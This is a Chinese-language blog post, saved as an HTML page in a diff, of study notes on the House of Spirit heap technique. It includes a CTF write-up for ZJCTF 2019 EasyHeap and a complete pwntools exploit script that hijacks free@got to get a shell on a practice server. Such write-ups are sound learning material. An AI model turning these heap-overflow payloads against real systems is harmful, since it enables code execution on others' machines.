@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="House of Spirit漏洞是一种特定类型的堆溢出攻击，它利用了现代操作系统中堆内存管理的安全特性，如地址空间布局随机化（ASLR）和堆栈保护机制，来绕过这些保护并执行任意代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of spirit学习笔记">
+<meta property="og:url" content="http://example.com/house-of-spirit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="House of Spirit漏洞是一种特定类型的堆溢出攻击，它利用了现代操作系统中堆内存管理的安全特性，如地址空间布局随机化（ASLR）和堆栈保护机制，来绕过这些保护并执行任意代码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252033517.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032407.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032826.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032488.png">
+<meta property="article:published_time" content="2024-07-08T12:32:20.000Z">
+<meta property="article:modified_time" content="2025-10-16T13:10:47.622Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252033517.png">
+
+<link rel="canonical" href="http://example.com/house-of-spirit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>house of spirit学习笔记 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/house-of-spirit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          house of spirit学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-08 20:32:20" itemprop="dateCreated datePublished" datetime="2024-07-08T20:32:20+08:00">2024-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-16 21:10:47" itemprop="dateModified" datetime="2025-10-16T21:10:47+08:00">2025-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>House of Spirit漏洞是一种特定类型的堆溢出攻击，它利用了现代操作系统中堆内存管理的安全特性，如地址空间布局随机化（ASLR）和堆栈保护机制，来绕过这些保护并执行任意代码。</p>
+<span id="more"></span>
+
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
+<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+</ul>
+<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
+<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="ZJCTF 2019]EasyHeap"></a><em>ZJCTF 2019]EasyHeap</em></h2><p>&#x3D;&#x3D;<em>uaf</em> + 堆溢出 + <em>house of spirit</em> + <em>double free</em>&#x3D;&#x3D;</p>
+<h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
+<li>如果想覆盖任意地址的数据，那么可以在任意地址或其前面构造一个<code>fake_chunk</code>，然后使<code>fastbins</code>中的<code>fd</code>指针指向这个<code>fake_chunk</code>的首地址（可以通过堆溢出），我们便能通过从<code>fastbins</code>获取<code>chunk</code>的方式来改写任意地址里的数据。</li>
+<li><code>fastbins</code>中是以单链表形式管理<code>fastbin_chunk</code>的，每个<code>fastbin_chunk</code>的<code>fd</code>指针指向链表中的下一个<code>fastbin_chunk</code>，最后一个<code>fastbin_chunk</code>的<code>fd</code>的值是<code>0</code>。</li>
+<li>程序中通常会有一张表来管理申请的<code>chunk</code>，本题中，<code>heaparray</code>数组中的一个单元指向一个<code>chunk</code>。</li>
+</ol>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>整体思路：</strong>	</p>
+<p>​	程序中有_sytsem_函数，_RELRO_保护是_Partial RELRO_，所以我们可以劫持_free_的_got_表为_system@plt_，再_free_一个_chunk_即可得到_shell_。</p>
+<p>​	程序中通常会有一张表来管理申请的_chunk_，本题中，_heaparray_数组便存放着我们申请的每一个堆块的内容地址。我先随便申请了两个_chunk_，<code>0x6020e0</code>是_heaparray_的首地址，如图：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252033517.png" alt="image-20240708182417742" style="zoom: 67%;" />
+
+<h4 id="构造fake-chunk加入fastbins"><a href="#构造fake-chunk加入fastbins" class="headerlink" title="构造fake_chunk加入fastbins"></a>构造<em>fake_chunk</em>加入<em>fastbins</em></h4><p>​	我们需要在<em>heaparray</em>的地址前面找到一个合适的地址，来错位偏移构造一个<em>size</em>为<code>0x7f</code>的<em>fake_chunk</em>，如图，以<code>0x6020ad</code>为<em>fake_chunk</em>的首地址。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032487.png" alt="image-20240709105407483" style="zoom:80%;" />
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032407.png" alt="image-20240709105625469"></p>
+<p>​	然后将<em>fake_chunk</em>添加到<em>fastbins</em>中，也就是让<em>fastbin_chunk0</em>的<em>fd</em>指针指向<code>0x6020ad</code>这个地址。通过<em>chunk1</em>溢出，然后覆盖<em>fastbins_chunk0</em>的<em>fd</em>指针为<code>0x6020ad</code>即可。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032705.png" alt="image-20240708185805628" style="zoom: 67%;" />
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line"><span class="comment">#b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;A&#x27;*(0x60-0x8)填充chunk1</span></span><br><span class="line"><span class="comment">#b&#x27;B&#x27;*0x8填充fastbins_chunk0的前8个字节</span></span><br><span class="line"><span class="comment">#p64(0x71)是使后面释放fastbins_chunk0成chunk2后的size不变</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<h4 id="写free-got到heaparray-0"><a href="#写free-got到heaparray-0" class="headerlink" title="写free_got到heaparray[0]"></a>写<em>free_got</em>到<em>heaparray[0]</em></h4><p>​	把<code>free_got</code>写到<code>heaparray[0]</code>，这样后面修改<em>chunk0</em>的值为<em>system_plt</em>，其实就是修改<em>free@got</em>表的值为<em>sysytm_plt</em>，那么怎么写呢？</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;eeee&quot;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#第一次创建的堆块的是fastbins_chunk0，即fastbin中地址为0x1d000e0的chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#因为fastbins_chunk0的fd指针是0x6020ad，所以第二次创建的chunk的起始地址是0x6020ad</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x23</span>+p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	先再创建两个<em>chunk</em>，第一个就是释放后的<em>fastbins_chunk0</em>，即<em>fastbin</em>中地址为<code>0x1d000e0</code>的<em>chunk</em>。然后我其实在_heap_中只看到<code>3</code>个<em>chunk</em>，一直不知道<em>chunk3</em>去哪儿了。（其实<em>chunk3</em>就是前面构造的<em>fake_chunk</em>）</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032826.png" alt="image-20240709103039101" style="zoom:67%;" />
+
+<p>​	后来想到前面<em>fastbin</em>中的<em>fastbins_chunk0</em>的<em>fd</em>指针指向的是<code>0x6020ad</code>，所以就看了这个地址，里面果然是<em>chunk3</em>的数据，也就是说<em>chunk3</em>就是前面构造的<em>fake_chunk</em>。如图可以看到写入的<code>0x20*&quot;f&quot;</code>：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252032488.png" alt="image-20240709102425216" style="zoom:80%;" />
+
+<p>​	而<code>0x6020ad</code>后面正好是数组<em>heaprray</em>的地址<code>0x6020e0</code>，也就是说我们可以通过堆溢出填充<em>chunk3</em>到<em>heaprray[0]<em>，并修改</em>heaprray[0]<em>的值。（这也是为什么前面要在</em>heaparray</em>的地址前面找合适的地址来构造<em>fake_chunk</em>了）</p>
+<h4 id="写system-plt到free-got"><a href="#写system-plt到free-got" class="headerlink" title="写system_plt到free_got"></a>写<em>system_plt</em>到<em>free_got</em></h4><p>​	现在，<code>heaparray[0]</code>的值是<code>free_got</code>，我们直接修改<em>chunk0</em>的内容为<code>system_plt</code>。然后再<code>delete(1)</code><em>call</em>  <em>free</em>的时候，调用的其实是system函数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(elf.plt[<span class="string">&quot;system&quot;</span>])<span class="comment">#修改free@got表为system的地址，后面再call free的时候，调用的其实是system函数</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25585</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400cdc</span>,<span class="number">0x400ce8</span>,<span class="number">0x400cf4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x60</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;e&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x23</span>+p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	如果想覆盖任意地址的数据，那么可以在任意地址或其前面构造一个<code>fake_chunk</code>，然后使<code>fastbins</code>中的<code>fd</code>指针指向这个<code>fake_chunk</code>的首地址（可以通过堆溢出），我们便能通过从<code>fastbins</code>获取<code>chunk</code>的方式来改写任意地址里的数据。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E8%B5%9B%E9%A2%98wp/NKCTF-Maimai%E6%9F%A5%E5%88%86%E5%99%A8/" rel="prev" title="NKCTF_Maimai查分器">
+      <i class="fa fa-chevron-left"></i> NKCTF_Maimai查分器
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/unsorted-bin-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="unsorted bin attack学习笔记">
+      unsorted bin attack学习笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-EasyHeap"><span class="nav-number">2.</span> <span class="nav-text">ZJCTF 2019]EasyHeap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%94%B6%E8%8E%B7"><span class="nav-number">2.1.</span> <span class="nav-text">学习与收获</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0fake-chunk%E5%8A%A0%E5%85%A5fastbins"><span class="nav-number">2.2.1.</span> <span class="nav-text">构造fake_chunk加入fastbins</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99free-got%E5%88%B0heaparray-0"><span class="nav-number">2.2.2.</span> <span class="nav-text">写free_got到heaparray[0]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99system-plt%E5%88%B0free-got"><span class="nav-number">2.2.3.</span> <span class="nav-text">写system_plt到free_got</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
